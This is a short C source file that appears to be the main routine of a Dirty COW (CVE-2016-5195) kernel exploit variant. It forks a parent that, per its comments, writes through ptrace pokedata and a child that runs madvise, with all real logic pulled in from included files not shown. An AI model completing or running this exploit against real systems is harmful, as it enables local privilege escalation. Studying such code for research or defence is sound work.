#include "01-program.inc.c"

int main(int argc, char *argv[])
{
#include "51-code.main.inc.c"
    int child_pid = fork();
    if (child_pid)
    // Turtiwg (tracer) pokedata (write) on DirtyCow
    {
#include "52-code.parent.inc.c"
    }
    else
    // DirtyCow (tracee and madvise)
    {
#include "53-code.child.inc.c"
    }
}
